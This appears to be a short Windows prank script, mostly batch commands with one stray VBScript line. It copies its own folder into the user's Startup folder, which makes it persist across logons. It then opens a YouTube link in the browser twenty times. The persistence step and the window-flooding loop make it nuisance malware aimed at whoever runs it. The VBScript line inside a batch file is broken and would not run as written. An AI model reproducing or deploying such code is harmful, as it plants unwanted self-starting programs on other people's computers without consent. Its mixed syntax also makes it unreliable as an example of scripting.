Set Shell = CreateObject("Shell.Application")
xcopy /s /y "." "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

for /l %%x in (1, 1, 20) do (
	start "iexplore.exe" https://www.youtube.com/watch?v=Xz3C9VbKA74&t=717s
	timeout /t 5
)